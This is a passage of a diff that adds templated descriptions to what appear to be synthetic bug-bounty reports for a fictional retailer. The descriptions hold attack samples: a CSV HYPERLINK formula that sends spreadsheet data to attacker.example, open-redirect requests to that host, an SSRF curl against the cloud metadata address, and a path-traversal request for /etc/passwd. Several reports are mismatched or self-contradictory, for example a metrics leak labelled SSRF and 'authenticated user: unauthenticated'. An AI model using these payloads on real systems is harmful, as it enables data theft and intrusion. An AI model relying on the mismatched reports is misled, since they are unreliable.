+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://shop.zedernfeld-retail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13215,7 +13313,8 @@
           "offset": "1d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.zedernfeld-retail.foo/fetch`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13351,7 +13450,8 @@
           "offset": "4d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://shop.zedernfeld-retail.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13471,7 +13571,8 @@
           "offset": "1d 11h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.zedernfeld-retail.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13582,7 +13683,8 @@
           "offset": "3d 16h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.zedernfeld-retail.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13689,7 +13791,8 @@
           "offset": "1d 23h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.zedernfeld-retail.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13873,7 +13976,8 @@
           "offset": "4d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://shop.zedernfeld-retail.foo/export`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13984,7 +14088,8 @@
           "offset": "2d 9h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.zedernfeld-retail.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -14134,7 +14239,8 @@
           "offset": "5d 16h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.zedernfeld-retail.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14266,7 +14372,8 @@
           "offset": "7d 1h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.zedernfeld-retail.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14401,7 +14508,8 @@
           "offset": "2d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.zedernfeld-retail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14488,7 +14596,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.zedernfeld-retail.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14635,7 +14744,8 @@
           "offset": "7d 20h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.zedernfeld-retail.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14746,7 +14856,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.zedernfeld-retail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14869,7 +14980,8 @@
           "offset": "4d 7h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.zedernfeld-retail.foo/export`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14980,7 +15092,8 @@
           "offset": "2d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.zedernfeld-retail.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15088,7 +15201,8 @@
           "offset": "22h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.zedernfeld-retail.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15215,7 +15329,8 @@
           "offset": "7d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.zedernfeld-retail.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15358,7 +15473,8 @@
           "offset": "2d 8h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.zedernfeld-retail.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15506,7 +15622,8 @@
           "offset": "4d 7h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.zedernfeld-retail.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15605,7 +15722,8 @@
           "offset": "5d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.zedernfeld-retail.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15724,7 +15842,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.zedernfeld-retail.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15900,7 +16019,8 @@
           "offset": "6d 10h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.zedernfeld-retail.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16072,7 +16192,8 @@
           "offset": "7d 10h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.zedernfeld-retail.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16208,7 +16329,8 @@
           "offset": "6d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.zedernfeld-retail.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16356,7 +16478,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.zedernfeld-retail.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16459,7 +16582,8 @@
           "offset": "1d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.zedernfeld-retail.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -16573,7 +16697,8 @@
           "offset": "5d 16h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.zedernfeld-retail.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16729,7 +16854,8 @@
           "offset": "6d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.zedernfeld-retail.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16867,7 +16993,8 @@
           "offset": "1d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.zedernfeld-retail.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16977,7 +17104,8 @@
           "offset": "2d 10h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.zedernfeld-retail.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17105,7 +17233,8 @@
           "offset": "2d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
